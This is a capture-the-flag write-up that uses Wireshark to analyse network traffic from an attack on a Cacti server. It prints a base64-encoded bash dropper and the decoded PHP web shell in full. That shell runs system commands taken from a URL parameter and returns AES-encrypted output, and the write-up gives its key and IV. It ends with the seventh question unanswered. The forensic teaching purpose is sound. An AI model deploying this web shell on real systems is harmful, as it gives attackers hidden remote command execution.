# A Trail of Snow and Deception
## Difficulty: easy
> Oliver Mirth, Tinselwick's forensic expert, crouched by the glowing lantern post, tracing the shimmerdust trail with a gloved finger. It led into the snowdrifts, then disappeared, no footprints, no sign of a struggle. He glanced up at the flickering Snowglobe atop Sprucetop Tower, its light wavering like a fading star. "Someone’s been tampering with the magic," Oliver murmured. "But why?" He straightened, eyes narrowing. The trail might be gone, but the mystery was just beginning. Can Oliver uncover the secret behind the fading glow?

In this challenge, we are going to look for 7 flags.
Download the pcap file and open it on Wireshark to start the analysis.

# Flag 1
### What is the Cacti version in use? (e.g. 7.1.0)

Enter the wireshark filter: `http contains "version"`


<img width="646" height="714" alt="Screenshot at 2025-12-26 14-36-46" src="https://github.com/user-attachments/assets/87fa098c-db52-4cc3-a084-7fa700a58264" />

# Flag 2
### What is the set of credentials used to log in to the instance? (e.g., username:password)
Enter filter: `http contains "password"`

<img width="454" height="688" alt="Screenshot at 2025-12-26 14-56-48" src="https://github.com/user-attachments/assets/a807083a-722f-470d-bafd-4ca29c7d1ccd" />

Flag: `marnie.thistlewhip:Z4ZP_8QzKA`

# Flag 3
### Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they? (e.g., file1.php,file2.php,file3.php)

Enter filter: `http.request.method == "GET" && http.request.uri contains ".php"`

Then look for any sign of suspicious `.php` file. Scroll down and there are some unordinary named php file:

<img width="949" height="428" alt="Screenshot at 2025-12-26 15-54-15" src="https://github.com/user-attachments/assets/5e124819-e507-4c1e-8e07-4f7b900c624f" />

```
GET /cacti/JWUA5a1yj.php HTTP/1.1\r\n
GET /cacti/ornF85gfQ.php HTTP/1.1
GET /cacti/f54Avbg4.php?q=aWQ= HTTP/1.1
```

Flag: `JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php`

# Flag 4
### What file gets downloaded using curl during exploitation process? (e.g. filename)

<img width="1114" height="274" alt="Screenshot at 2025-12-26 16-02-12" src="https://github.com/user-attachments/assets/0b432d6c-3d44-4614-8d4e-65417b11ded3" />

<img width="738" height="716" alt="Screenshot at 2025-12-26 16-18-19" src="https://github.com/user-attachments/assets/74109762-5c24-4a0b-b131-2c895a167997" />

Flag: `bash`

# Flag 5
### What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)
If we try to decode the following injected shell script:

```
#!/bin/bash
echo PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=|base64 --decode > f54Avbg4.php
```

We will get this decoded php script:
```
<?php $A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";$A4gVaRmV = "pZ7qR1tLw8Df3XbK";$A4gVaXzY = base64_decode($_GET["q"]);$a54vag = shell_exec($A4gVaXzY);$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);echo base64_encode($A4gVaQdF); ?>
```

Analyzing it further tells us that the variable `$a54vag` executes the shell commands of the variable `$A4gVaXzY` which decodes the base64 script with the `q` request.

Flag: `$a54vag`

# Flag 6
### What is the system machine hostname? (e.g. server01)
Decoding the previous trail of `f54Avbg4.php` leds us to these bash commands:

<img width="1340" height="666" alt="image" src="https://github.com/user-attachments/assets/a07287bc-879d-403e-a2a9-1da15867a777" />


Now we need to look for the server's response:

<img width="741" height="717" alt="Screenshot at 2025-12-26 17-16-32" src="https://github.com/user-attachments/assets/e8b1a0d9-94b1-45c0-bcc0-dcb37b6491af" />

If you remember the previous file `f54Avbg4.php`, it provided the key and also the encryption/decryption processes. Let's look at the cleaner version:

```
$key = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";   // 32 bytes
$iv  = "pZ7qR1tLw8Df3XbK";                  // 16 bytes

$input = base64_decode($_GET["q"]);
$output = openssl_encrypt(
    shell_exec($input),
    "AES-256-CBC",
    $key,
    OPENSSL_RAW_DATA,
    $iv
);
echo base64_encode($output);
```

Let's use the generated script of ChatGPT to decrypt the long encrypted string:
```
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

ciphertext_b64 = """PASTE_THE_BIG_BASE64_STRING_HERE"""

key = b"kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"
iv  = b"pZ7qR1tLw8Df3XbK"

ciphertext = b64decode(ciphertext_b64)

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

print(plaintext.decode(errors="ignore"))
```

# Flag 7
### What is the database password used by Cacti? (e.g. Password123)
